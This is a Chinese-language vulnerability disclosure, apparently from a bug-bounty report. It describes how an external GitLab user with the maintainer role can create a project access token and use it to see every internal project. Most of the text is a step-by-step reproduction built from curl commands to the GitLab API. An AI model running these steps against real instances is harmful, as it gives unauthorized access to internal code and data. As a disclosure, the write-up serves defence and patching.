背景

白帽小哥joaxcar于2021年五月提交的这个漏洞: 在允许“项目令牌”的GitLab实例的任何项目中,在允许“项目令牌(project tokens)”的GitLab实例的任何项目中，一个“外部用户(external user)”(一个状态为外部的用户帐户)被授予“维护者(maintainer)”角色，可以将其特权提升到“内部(Internal)”。具有维护者权限的外部用户可以创建一个项目令牌，该令牌将连接到具有GitLab实例的内部权限的bot用户。因此，现在可以作为Guest用户访问所有内部项目和代码片段。包括:

  • 像拥有Guest权限一样访问有关内部项目的所有信息(包括源代码)
  • 在内部项目中创建issue
  • 创建项目和组

外部用户是由文档描述的一种让contractor访问GitLab实例链接的方法.即: 例如，当一个contractor正在处理一个给定的项目，并且只能访问该项目时，这个特性可能很有用。

复现步骤

1.以管理员用户登录

2.访问https://gitlab.domain.com/-/profile/personal_access_tokens并为管理员创建一个访问令牌

3.启动一个终端，并创建这些将在后续命令中使用的变量(注意要替换相对应的url和<ADMIN_TOKEN>)

server_url='https://gitlab.domain.com'
admin_token='<ADMIN_TOKEN>'

4.使用管理令牌创建外部用户，并记录创建的用户ID

curl --request POST --header "PRIVATE-TOKEN: $admin_token" \
--data "name=External User" \
--data "username=external_user_01" \
--data "external=true" \
--data "skip_confirmation=true" \
--data "password=Safepass001" \
--data "email=external_user@example.com" \
"$server_url/api/v4/users"

5.为external_user添加一个shell变量(注意要替换ID)

external_user='<ID>' 

6.使用admin令牌为外部用户生成访问令牌:

curl --request POST --header "PRIVATE-TOKEN: $admin_token" \
--data "name=external_token" \
--data "scopes[]=api" \
"$server_url/api/v4/users/$external_user/personal_access_tokens"

7.为external_token添加一个shell变量(注意要替换< external_token >)

external_token='<EXTERNAL_TOKEN>' 

8.创建第一个内部项目，并记录下项目ID

curl --request POST --header "PRIVATE-TOKEN: $admin_token" \
--data "name=Internal project 1" \
--data "visibility=internal"  \
"$server_url/api/v4/projects"

9.创建第二个内部项目，并记录下项目ID

curl --request POST --header "PRIVATE-TOKEN: $admin_token" \
--data "name=Internal project 2" \
--data "visibility=internal"  \
"$server_url/api/v4/projects"

10.为项目1和2添加shell变量

project_1='<ID1>'
project_2='<ID2>'

11.将外部用户作为maintainer加入内部业务群组1

curl --request POST --header "PRIVATE-TOKEN: $admin_token" \
--data "user_id=$external_user&access_level=40" \
"$server_url/api/v4/projects/$project_1/members"

12.使用外部帐户访问令牌请求内部项目列表。验证只返回项目1。

curl --request GET --header "PRIVATE-TOKEN: $external_token" \
"$server_url/api/v4/projects?visibility=internal"

13.使用外部用户访问令牌生成项目访问令牌，记录该令牌:

curl --request POST --header "PRIVATE-TOKEN: $external_token" \
--header "Content-Type:application/json" \
--data '{ "name":"attack_token", "scopes":["api"]}' \
"$server_url/api/v4/projects/$project_1/access_tokens"

14.为项目访问令牌添加一个shell变量(替换<PROJECT_TOKEN>)

project_token='<PROJECT_TOKEN>' 

15.使用生成的项目帐户访问令牌请求内部项目列表。确认所有内部项目现在都是可见的。

curl --request GET --header "PRIVATE-TOKEN: $project_token" \
"$server_url/api/v4/projects?visibility=internal"
